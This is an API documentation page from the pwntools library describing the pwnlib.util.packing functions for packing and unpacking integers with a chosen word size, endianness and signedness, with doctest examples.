<code class="descclassname">pwnlib.util.packing.</code><code class="descname">make_packer</code><span class="sig-paren">(</span><em>word_size = None</em>, <em>endianness = None</em>, <em>sign = None</em><span class="sig-paren">)</span> &#x2192; number → str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/packing.py#L359-419"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.packing.make_packer" title="Permalink to this definition">¶</a></dt>
<dd><p>Creates a packer by &#8220;freezing&#8221; the given arguments.</p>
<p>Semantically calling <code class="docutils literal"><span class="pre">make_packer(w,</span> <span class="pre">e,</span> <span class="pre">s)(data)</span></code> is equivalent to calling
<code class="docutils literal"><span class="pre">pack(data,</span> <span class="pre">w,</span> <span class="pre">e,</span> <span class="pre">s)</span></code>. If word_size is one of 8, 16, 32 or 64, it is however
faster to call this function, since it will then use a specialized version.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>word_size</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The word size to be baked into the returned packer or the string all.</li>
<li><strong>endianness</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The endianness to be baked into the returned packer. (&#8220;little&#8221;/&#8221;big&#8221;)</li>
<li><strong>sign</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The signness to be baked into the returned packer. (&#8220;unsigned&#8221;/&#8221;signed&#8221;)</li>
<li><strong>kwargs</strong> &#8211; Additional context flags, for setting by alias (e.g. <code class="docutils literal"><span class="pre">endian=</span></code> rather than index)</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A function, which takes a single argument in the form of a number and returns a string
of that number in a packed form.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">make_packer</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="s1">&#39;unsigned&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span>
<span class="go">&lt;function _p32lu at 0x...&gt;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="p">(</span><span class="mi">42</span><span class="p">)</span>
<span class="go">&#39;*\x00\x00\x00&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="gt">Traceback (most recent call last):</span>
    <span class="o">...</span>
<span class="gr">error</span>: <span class="n">integer out of range for &#39;I&#39; format code</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">make_packer</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="s1">&#39;unsigned&#39;</span><span class="p">)</span>
<span class="go">&lt;function &lt;lambda&gt; at 0x...&gt;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.packing.make_unpacker">
<code class="descclassname">pwnlib.util.packing.</code><code class="descname">make_unpacker</code><span class="sig-paren">(</span><em>word_size = None</em>, <em>endianness = None</em>, <em>sign = None</em>, <em>**kwargs</em><span class="sig-paren">)</span> &#x2192; str → number<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/packing.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.packing.make_unpacker" title="Permalink to this definition">¶</a></dt>
<dd><p>Creates a unpacker by &#8220;freezing&#8221; the given arguments.</p>
<p>Semantically calling <code class="docutils literal"><span class="pre">make_unpacker(w,</span> <span class="pre">e,</span> <span class="pre">s)(data)</span></code> is equivalent to calling
<code class="docutils literal"><span class="pre">unpack(data,</span> <span class="pre">w,</span> <span class="pre">e,</span> <span class="pre">s)</span></code>. If word_size is one of 8, 16, 32 or 64, it is however
faster to call this function, since it will then use a specialized version.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>word_size</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The word size to be baked into the returned packer.</li>
<li><strong>endianness</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The endianness to be baked into the returned packer. (&#8220;little&#8221;/&#8221;big&#8221;)</li>
<li><strong>sign</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The signness to be baked into the returned packer. (&#8220;unsigned&#8221;/&#8221;signed&#8221;)</li>
<li><strong>kwargs</strong> &#8211; Additional context flags, for setting by alias (e.g. <code class="docutils literal"><span class="pre">endian=</span></code> rather than index)</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A function, which takes a single argument in the form of a string and returns a number
of that string in an unpacked form.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">u</span> <span class="o">=</span> <span class="n">make_unpacker</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="s1">&#39;unsigned&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">u</span>
<span class="go">&lt;function _u32lu at 0x...&gt;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">u</span><span class="p">(</span><span class="s1">&#39;/bin&#39;</span><span class="p">))</span>
<span class="go">&#39;0x6e69622f&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">u</span><span class="p">(</span><span class="s1">&#39;abcde&#39;</span><span class="p">)</span>
<span class="gt">Traceback (most recent call last):</span>
    <span class="o">...</span>
<span class="gr">error</span>: <span class="n">unpack requires a string argument of length 4</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">make_unpacker</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">,</span> <span class="n">sign</span><span class="o">=</span><span class="s1">&#39;unsigned&#39;</span><span class="p">)</span>
<span class="go">&lt;function &lt;lambda&gt; at 0x...&gt;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.packing.p16">
<code class="descclassname">pwnlib.util.packing.</code><code class="descname">p16</code><span class="sig-paren">(</span><em>number</em>, <em>sign</em>, <em>endian</em>, <em>...</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/packing.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.packing.p16" title="Permalink to this definition">¶</a></dt>
<dd><p>Packs an 16-bit integer</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>number</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Number to convert</li>
<li><strong>endianness</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Endianness of the converted integer (&#8220;little&#8221;/&#8221;big&#8221;)</li>
<li><strong>sign</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Signedness of the converted integer (&#8220;unsigned&#8221;/&#8221;signed&#8221;)</li>
<li><strong>kwargs</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Arguments passed to context.local(), such as
<code class="docutils literal"><span class="pre">endian</span></code> or <code class="docutils literal"><span class="pre">signed</span></code>.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The packed number as a string</p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.packing.p32">
<code class="descclassname">pwnlib.util.packing.</code><code class="descname">p32</code><span class="sig-paren">(</span><em>number</em>, <em>sign</em>, <em>endian</em>, <em>...</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/packing.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.packing.p32" title="Permalink to this definition">¶</a></dt>
<dd><p>Packs an 32-bit integer</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>number</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Number to convert</li>
<li><strong>endianness</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Endianness of the converted integer (&#8220;little&#8221;/&#8221;big&#8221;)</li>
<li><strong>sign</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Signedness of the converted integer (&#8220;unsigned&#8221;/&#8221;signed&#8221;)</li>
<li><strong>kwargs</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Arguments passed to context.local(), such as
<code class="docutils literal"><span class="pre">endian</span></code> or <code class="docutils literal"><span class="pre">signed</span></code>.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The packed number as a string</p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.packing.p64">
<code class="descclassname">pwnlib.util.packing.</code><code class="descname">p64</code><span class="sig-paren">(</span><em>number</em>, <em>sign</em>, <em>endian</em>, <em>...</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/packing.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.packing.p64" title="Permalink to this definition">¶</a></dt>
<dd><p>Packs an 64-bit integer</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>number</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Number to convert</li>
<li><strong>endianness</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Endianness of the converted integer (&#8220;little&#8221;/&#8221;big&#8221;)</li>
<li><strong>sign</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Signedness of the converted integer (&#8220;unsigned&#8221;/&#8221;signed&#8221;)</li>
<li><strong>kwargs</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Arguments passed to context.local(), such as
<code class="docutils literal"><span class="pre">endian</span></code> or <code class="docutils literal"><span class="pre">signed</span></code>.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The packed number as a string</p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.packing.p8">
<code class="descclassname">pwnlib.util.packing.</code><code class="descname">p8</code><span class="sig-paren">(</span><em>number</em>, <em>sign</em>, <em>endian</em>, <em>...</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/packing.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.packing.p8" title="Permalink to this definition">¶</a></dt>
<dd><p>Packs an 8-bit integer</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>number</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Number to convert</li>
<li><strong>endianness</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Endianness of the converted integer (&#8220;little&#8221;/&#8221;big&#8221;)</li>
<li><strong>sign</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Signedness of the converted integer (&#8220;unsigned&#8221;/&#8221;signed&#8221;)</li>
<li><strong>kwargs</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Arguments passed to context.local(), such as
<code class="docutils literal"><span class="pre">endian</span></code> or <code class="docutils literal"><span class="pre">signed</span></code>.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The packed number as a string</p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.packing.pack">
<code class="descclassname">pwnlib.util.packing.</code><code class="descname">pack</code><span class="sig-paren">(</span><em>number</em>, <em>word_size = None</em>, <em>endianness = None</em>, <em>sign = None</em>, <em>**kwargs</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/packing.py#L44-156"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.packing.pack" title="Permalink to this definition">¶</a></dt>
<dd><p>Packs arbitrary-sized integer.</p>
<p>Word-size, endianness and signedness is done according to context.</p>
<p><cite>word_size</cite> can be any positive number or the string &#8220;all&#8221;. Choosing the
string &#8220;all&#8221; will output a string long enough to contain all the significant
bits and thus be decodable by <a class="reference internal" href="#pwnlib.util.packing.unpack" title="pwnlib.util.packing.unpack"><code class="xref py py-func docutils literal"><span class="pre">unpack()</span></code></a>.</p>
<p><cite>word_size</cite> can be any positive number. The output will contain word_size/8
rounded up number of bytes. If word_size is not a multiple of 8, it will be
padded with zeroes up to a byte boundary.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>number</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Number to convert</li>
<li><strong>word_size</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Word size of the converted integer or the string &#8216;all&#8217;.</li>
<li><strong>endianness</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Endianness of the converted integer (&#8220;little&#8221;/&#8221;big&#8221;)</li>
<li><strong>sign</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Signedness of the converted integer (False/True)</li>
<li><strong>kwargs</strong> &#8211; Anything that can be passed to context.local</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The packed number as a string.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">pack</span><span class="p">(</span><span class="mh">0x414243</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
<span class="go">&#39;ABC&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">pack</span><span class="p">(</span><span class="mh">0x414243</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
<span class="go">&#39;CBA&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">pack</span><span class="p">(</span><span class="mh">0x814243</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>
<span class="go">&#39;\x81BC&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">pack</span><span class="p">(</span><span class="mh">0x814243</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
<span class="gt">Traceback (most recent call last):</span>
   <span class="c">...</span>
<span class="gr">ValueError</span>: <span class="n">pack(): number does not fit within word_size</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">pack</span><span class="p">(</span><span class="mh">0x814243</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
<span class="go">&#39;\x00\x81BC&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">pack</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;all&#39;</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
<span class="go">&#39;\xff&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">pack</span><span class="p">(</span><span class="o">-</span><span class="mi">256</span><span class="p">,</span> <span class="s1">&#39;all&#39;</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
<span class="go">&#39;\xff\x00&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">pack</span><span class="p">(</span><span class="mh">0x0102030405</span><span class="p">,</span> <span class="s1">&#39;all&#39;</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
<span class="go">&#39;\x05\x04\x03\x02\x01&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">pack</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="go">&#39;\xff\xff\xff\xff&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">pack</span><span class="p">(</span><span class="mh">0x80000000</span><span class="p">,</span> <span class="s1">&#39;all&#39;</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
<span class="go">&#39;\x00\x80\x00\x00\x00&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.packing.routine">
<code class="descclassname">pwnlib.util.packing.</code><code class="descname">routine</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/packing.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.packing.routine" title="Permalink to this definition">¶</a></dt>
<dd><p>u32(number, sign, endian, ...) -&gt; int</p>
<p>Unpacks an 32-bit integer</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; String to convert</li>
<li><strong>endianness</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Endianness of the converted integer (&#8220;little&#8221;/&#8221;big&#8221;)</li>
<li><strong>sign</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Signedness of the converted integer (&#8220;unsigned&#8221;/&#8221;signed&#8221;)</li>
<li><strong>kwargs</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Arguments passed to context.local(), such as
<code class="docutils literal"><span class="pre">endian</span></code> or <code class="docutils literal"><span class="pre">signed</span></code>.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The unpacked number</p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.packing.u16">
<code class="descclassname">pwnlib.util.packing.</code><code class="descname">u16</code><span class="sig-paren">(</span><em>number</em>, <em>sign</em>, <em>endian</em>, <em>...</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/packing.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.packing.u16" title="Permalink to this definition">¶</a></dt>
<dd><p>Unpacks an 16-bit integer</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; String to convert</li>
<li><strong>endianness</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Endianness of the converted integer (&#8220;little&#8221;/&#8221;big&#8221;)</li>
<li><strong>sign</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Signedness of the converted integer (&#8220;unsigned&#8221;/&#8221;signed&#8221;)</li>
<li><strong>kwargs</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Arguments passed to context.local(), such as
<code class="docutils literal"><span class="pre">endian</span></code> or <code class="docutils literal"><span class="pre">signed</span></code>.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The unpacked number</p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.packing.u32">
<code class="descclassname">pwnlib.util.packing.</code><code class="descname">u32</code><span class="sig-paren">(</span><em>number</em>, <em>sign</em>, <em>endian</em>, <em>...</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/packing.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.packing.u32" title="Permalink to this definition">¶</a></dt>
<dd><p>Unpacks an 32-bit integer</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; String to convert</li>
<li><strong>endianness</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Endianness of the converted integer (&#8220;little&#8221;/&#8221;big&#8221;)</li>
<li><strong>sign</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Signedness of the converted integer (&#8220;unsigned&#8221;/&#8221;signed&#8221;)</li>
<li><strong>kwargs</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Arguments passed to context.local(), such as
<code class="docutils literal"><span class="pre">endian</span></code> or <code class="docutils literal"><span class="pre">signed</span></code>.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The unpacked number</p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.packing.u64">
<code class="descclassname">pwnlib.util.packing.</code><code class="descname">u64</code><span class="sig-paren">(</span><em>number</em>, <em>sign</em>, <em>endian</em>, <em>...</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/packing.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.packing.u64" title="Permalink to this definition">¶</a></dt>
<dd><p>Unpacks an 64-bit integer</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; String to convert</li>
<li><strong>endianness</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Endianness of the converted integer (&#8220;little&#8221;/&#8221;big&#8221;)</li>
<li><strong>sign</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Signedness of the converted integer (&#8220;unsigned&#8221;/&#8221;signed&#8221;)</li>
<li><strong>kwargs</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Arguments passed to context.local(), such as
<code class="docutils literal"><span class="pre">endian</span></code> or <code class="docutils literal"><span class="pre">signed</span></code>.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The unpacked number</p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.packing.u8">
<code class="descclassname">pwnlib.util.packing.</code><code class="descname">u8</code><span class="sig-paren">(</span><em>number</em>, <em>sign</em>, <em>endian</em>, <em>...</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/packing.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.packing.u8" title="Permalink to this definition">¶</a></dt>
<dd><p>Unpacks an 8-bit integer</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; String to convert</li>
<li><strong>endianness</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Endianness of the converted integer (&#8220;little&#8221;/&#8221;big&#8221;)</li>
<li><strong>sign</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Signedness of the converted integer (&#8220;unsigned&#8221;/&#8221;signed&#8221;)</li>
<li><strong>kwargs</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Arguments passed to context.local(), such as
<code class="docutils literal"><span class="pre">endian</span></code> or <code class="docutils literal"><span class="pre">signed</span></code>.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The unpacked number</p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.packing.unpack">
<code class="descclassname">pwnlib.util.packing.</code><code class="descname">unpack</code><span class="sig-paren">(</span><em>data</em>, <em>word_size = None</em>, <em>endianness = None</em>, <em>sign = None</em>, <em>**kwargs</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/packing.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.packing.unpack" title="Permalink to this definition">¶</a></dt>
<dd><p>Packs arbitrary-sized integer.</p>
<p>Word-size, endianness and signedness is done according to context.</p>
